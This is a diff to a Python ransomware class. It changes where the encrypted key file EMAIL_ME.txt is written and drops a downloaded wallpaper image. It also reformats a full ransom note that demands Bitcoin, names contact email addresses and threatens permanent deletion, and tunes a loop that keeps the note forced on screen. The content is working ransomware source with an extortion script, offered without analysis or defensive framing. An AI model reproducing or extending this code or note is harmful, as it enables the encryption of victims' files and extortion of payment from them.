@@ -85,7 +85,7 @@ class RansomWare:
 
         # Write encrypted fernet key to dekstop as well so they can send this file to be unencrypted and
         # get system/files back
-        with open(f'{self.sysRoot}\Desktop\EMAIL_ME.txt', 'wb') as fa:
+        with open(f'{DESKTOP_PATH}\{PROJECT_NAME}\EMAIL_ME.txt', 'wb') as fa:
             fa.write(enc_fernent_key)
         # Assign self.key to encrypted fernet key
         self.key = enc_fernent_key
@@ -208,9 +208,6 @@ class RansomWare:
         webbrowser.open(f'file://{abs_path}')
 
     def change_desktop_background(self):
-        imageUrl = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876' \
-                   '-100749983-large.jpg'
-        # Go to specif url and download+save image using absolute path
         # path = r"C:\Users\Maaz\Documents\Python-Ransomware\bot.jpg"
         path = f"{DESKTOP_PATH}\\{PROJECT_NAME}" + r'\bot.jpg'
 
@@ -222,38 +219,36 @@ class RansomWare:
         date = datetime.date.today().strftime('%d-%B-Y')
         with open('RANSOM_NOTE.txt', 'w') as f:
             f.write(f'''
-            
-** Your system have been encrypted with a Military grade encryption algorithm. **
-
-** There is no way to restore your data without a special key. **
-
-Only we can decrypt your files!
-
-To purchase your key and restore your data, please follow these three easy steps:
-
-1. Email the file called EMAIL_ME.txt at C:\\Users\Maaz\Desktop\EMAIL_ME.txt to maazsabahuddin@gmail.com
-
-2. You will receive your personal BTC address for payment.
-   Once payment has been completed, send another email to altamashkarlekar@gmail.com stating "PAID".
-   We will check to see if payment has been paid.
-
-3. You will receive a text file with your KEY that will unlock all your files. 
-   IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin to decrypt 
-   all files.
-
-WARNING:
-
-- Do NOT attempt to decrypt your files with any software because that will not work, and may cost you more to
-unlock your files.
-
-- Do NOT change file names, mess with the files, or run decryption software as it will cost you more to unlock
-your files and there is a high chance you will lose your files forever.
-
-Do NOT send "PAID" button without paying, price WILL go up for disobedience.
-
-Do NOT think that we won't delete your files altogether and throw away the key if you refuse to pay.
-
-''')
+                ** Your system have been encrypted with a Military grade encryption algorithm. **
+                
+                ** There is no way to restore your data without a special key. **
+                
+                Only we can decrypt your files!
+                
+                To purchase your key and restore your data, please follow these three easy steps:
+                
+                1. Email the file called EMAIL_ME.txt at C:\\Users\Maaz\Desktop\EMAIL_ME.txt to maazsabahuddin@gmail.com
+                
+                2. You will receive your personal BTC address for payment.
+                   Once payment has been completed, send another email to altamashkarlekar@gmail.com stating "PAID".
+                   We will check to see if payment has been paid.
+                
+                3. You will receive a text file with your KEY that will unlock all your files. 
+                   IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin to decrypt 
+                   all files.
+                
+                WARNING:
+                
+                - Do NOT attempt to decrypt your files with any software because that will not work, and may cost you more to
+                unlock your files.
+                
+                - Do NOT change file names, mess with the files, or run decryption software as it will cost you more to unlock
+                your files and there is a high chance you will lose your files forever.
+                
+                Do NOT send "PAID" button without paying, price WILL go up for disobedience.
+                
+                Do NOT think that we won't delete your files altogether and throw away the key if you refuse to pay.
+            ''')
 
     def show_ransom_note(self):
         # Open the ransom note
@@ -267,16 +262,16 @@ Do NOT think that we won't delete your files altogether and throw away the key i
                 pass
             else:
                 print('Ransom note is not the top window - kill/create process again')  # Debugging/Testing
-                # Kill ransom note so we can open it agian and make sure ransom note is in ForeGround
+                # Kill ransom note, so we can open it again and make sure ransom note is in ForeGround
                 # (top of all windows)
                 time.sleep(0.1)
                 ransom.kill()
                 # Open the ransom note
                 time.sleep(0.1)
                 ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
-            # sleep for 10 seconds
-            time.sleep(10)
-            count +=1 
+            # sleep for 5 seconds
+            time.sleep(5)
+            count += 1
             if count == 5:
                 break
     
